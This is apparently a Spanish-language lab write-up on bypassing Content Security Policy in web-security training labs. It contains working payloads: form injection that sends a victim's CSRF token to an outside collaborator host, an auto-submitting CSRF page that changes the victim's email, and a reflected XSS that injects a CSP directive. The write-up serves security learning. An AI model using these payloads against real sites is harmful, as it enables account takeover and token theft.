> Conseguimos salir del contexto de la etiqueta 'input' cerrando las comillas y la etiqueta, sin embargo, la web no nos permite insertar código javascript debido a las múltiples restricciones.

![](/img2/Pasted%20image%2020250729125440.png)

```
1. default-src 'self' --> Solo permite cargar recursos del mismo origen.
2. object-src 'none' --> Bloquea completamente objectos embedidos como (<object>,<embed>,<applet>).
3. style-src 'self' --> Bloquea CSS externo o inline.
4. script-src 'self' --> Bloquea scripts inline, eval y de terceros.
5. img-src 'self' --> Solo permite imágenes del mismo dominio.
6. base-uri 'none' --> Impide el uso del elemento <base>.
```

![](/img2/Pasted%20image%2020250729160338.png)

```html
?email="></form><form class="login-form" name="change-email-form" action="https://vyxelfzsnsdxwspp1uvn17mz2q8jw9ky.oastify.com?token=csrf.value" method="GET"><button class="button" type="submit">Click Me</button>
```

![](/img2/Pasted%20image%2020250729160430.png)

![](/img2/Pasted%20image%2020250729160518.png)

> Con el burp collaborator podemos recibir el token csrf obtenido en el campo oculto de la víctima.

![](/img2/Pasted%20image%2020250729160644.png)

![](/img2/Pasted%20image%2020250729160733.png)

- Injection

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a70008803dc8be481317f6900c8009f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="Wf8AVh0EmxklTPuHIwGbuwXTyaX2EDsY" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## XSS con CSP y técnica de bypass || Reflected XSS protected by CSP, with CSP bypass

![](/img2/Pasted%20image%2020250729172316.png)

> Vemos que en la cabecera del CSP existe la política 'report-url', la cual su función es enviar informes automáticos al servidor. En este caso esta petición se está efectuando con el parámetro 'token'.

![](/img2/Pasted%20image%2020250729172617.png)

![](/img2/Pasted%20image%2020250729172650.png)

> En este punto, tenemos el control sobre la cabecera CSP, para explotarlo simplemente tendríamos que añadir alguna política adicional que nos permita ejecutar código javascript.

![](/img2/Pasted%20image%2020250729173241.png)

- Injection

```html
<script>alert(1)</script>&token=test;script-src-elem 'unsafe-inline'
```